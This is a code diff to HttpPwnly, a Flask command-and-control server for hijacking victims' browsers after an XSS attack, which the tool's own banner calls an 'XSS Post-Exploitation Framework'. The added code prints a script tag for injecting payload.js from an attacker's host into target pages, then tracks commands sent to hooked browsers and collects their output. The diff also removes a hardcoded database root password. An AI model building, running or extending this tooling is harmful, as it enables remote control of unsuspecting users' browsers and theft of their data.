@@ -4,22 +4,30 @@ from flask.ext.cors import CORS
 import sqlite3
 from flask_sqlalchemy import SQLAlchemy
 from collections import OrderedDict
+import sys
 
+PORT = 9999 #default, overridden by sys.argv[1]
+if len(sys.argv)>1:
+    PORT = int(sys.argv[1])
+print "\nWelcome to HttpPwnly - An XSS Post-Exploitation Framework!\n"
+print "The framework defaults to running on port 9999, but you can change this by launching with a different port as the first arg: ./httppwnly.py [port]\n\n"
+print "Include the following script element in a page in order to hook into the framework:"
+print "<script id=\"hacker\" src=\"http://[attackers_ip]:"+str(PORT)+"/payload.js\"></script>\n\n"
+print "Visit http://[attackers_ip]:"+str(PORT)+"/dashboard and wait for incoming sessions!"
+raw_input("Press Enter to continue...")
 DATABASE = 'tasks.db'
 app = Flask(__name__)
 cors = CORS(app)
-app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:P@55w0rd!@localhost/httppwnly'
+app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///'+DATABASE
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
-
-#db config
-
 
 class Task(db.Model):
     id = db.Column(db.Integer, primary_key=True, autoincrement=False)
     client_id = db.Column(db.Integer, db.ForeignKey('client.id'), primary_key=True)
     input = db.Column(db.Text)
     output = db.Column(db.Text)
+    status = db.Column(db.Text)
     
     client = db.relationship('Client',
         backref=db.backref('tasks', lazy='dynamic'))
@@ -28,6 +36,7 @@ class Task(db.Model):
         self.client = client
         self.input = input
         self.output = output
+        self.status= "new"
     def __repr__(self):
         return '<Task %r>' % self.id
     def _asdict(self):
@@ -64,12 +73,13 @@ def register():
 def gettasks(client_id):
     print '[*] sending tasks for client ID: '+str(client_id)
     myclient = Client.query.filter_by(id=client_id).first()
-    tasklist = Task.query.filter(Task.client==myclient,Task.output.is_(None)).all()
+    tasklist = Task.query.filter(Task.client==myclient,Task.output.is_(None),Task.status.is_("new")).all() #select all tasks which have no output, that are the the "new" state (not "inprogress")
     tasks = []
     for task in tasklist:
         tasks.append({'id':task.id,'input':task.input})
-    print tasks
-    return jsonify({'tasks': tasks}), 201 #replace with db eventually
+        task.status="inprogress"
+        db.session.commit()        
+    return jsonify({'tasks': tasks}), 201 
 
 @app.route('/api/client/<int:client_id>/task/<int:task_id>/output', methods=['POST'])
 def recievetasks(client_id,task_id):
@@ -80,21 +90,12 @@ def recievetasks(client_id,task_id):
         myclient = Client.query.filter_by(id=client_id).first()
         mytask = Task.query.filter_by(client=myclient,id=task_id).first()
         mytask.output=str(task['output'])
+        mytask.status="complete"
         db.session.commit()
         print '[*] recieved output for clientid: '+str(client_id)+' taskid: '+str(task_id)
 
     return jsonify({'result': True}), 201
-
-@app.route('/api/tasks/add', methods=['POST'])
-def addtasks():
-    if not request.json:
-        abort(400)
-    for client in request.json['clients']:
-        for task in client['tasks']:
-            #do database insert for each Task
-            print client['id']
-            print task['task']
-            
+          
 @app.route('/api/client/<int:cid>/task/add', methods=['POST']) #require auth eventually
 def addtask(cid):
     if not request.json:
@@ -115,9 +116,8 @@ def addtask(cid):
     print '[*] Registered task id: '+str(mytask.id)
 
     return jsonify({'taskid': mytask.id}), 201
-    #return jsonify({'taskid': 'temp'}), 201
 
-@app.route('/api/client/<int:client_id>/task/<int:task_id>/output', methods=['GET'])
+@app.route('/api/client/<int:client_id>/task/<int:task_id>/output', methods=['GET']) #require auth eventually
 def gettaskoutput(client_id,task_id):
     myclient = Client.query.filter_by(id=int(client_id)).first()
     mytask = Task.query.filter_by(client=myclient,id=task_id).first()
@@ -133,12 +133,10 @@ def getTaskList():
         for task in client_tasks:
             temparr.append({"realtaskid":task.id,"input":task.input,"output":task.output})
         dblist['clients'].append({"id":client.id,"tasks":temparr})
-            #add task to temparr
-        #add clients to list
     print dblist
     return jsonify(dblist), 201
 
-@app.route('/api/clients/list', methods=['GET'])
+@app.route('/api/clients/list', methods=['GET']) #require auth eventually
 def getClientList():
     iddb = []
     clientlist = Client.query.all()
@@ -146,7 +144,7 @@ def getClientList():
         iddb.append(client.id)
     return jsonify({"clients":iddb}), 201 
 
-@app.route('/api/client/<int:client_id>/tasks/poll', methods=['GET'])
+@app.route('/api/client/<int:client_id>/tasks/poll', methods=['GET']) #require auth eventually
 def pollTasks(client_id):
     #this function basically gets a complete list of tasks for a particular client and returns taskid,true/false depending on whether output exists for it
     myclient = Client.query.filter_by(id=int(client_id)).first()
@@ -161,9 +159,9 @@ def pollTasks(client_id):
     print tasklist
     return jsonify({'tasks': tasklist}), 201
     
-@app.route('/dashboard', methods=['GET'])
+@app.route('/dashboard', methods=['GET']) #require auth eventually
 def serveDash():
     return open("dashboard.html").read()
     
 if __name__ == '__main__':
-    app.run(debug=True,port=8081)
+    app.run(debug=False,port=PORT)
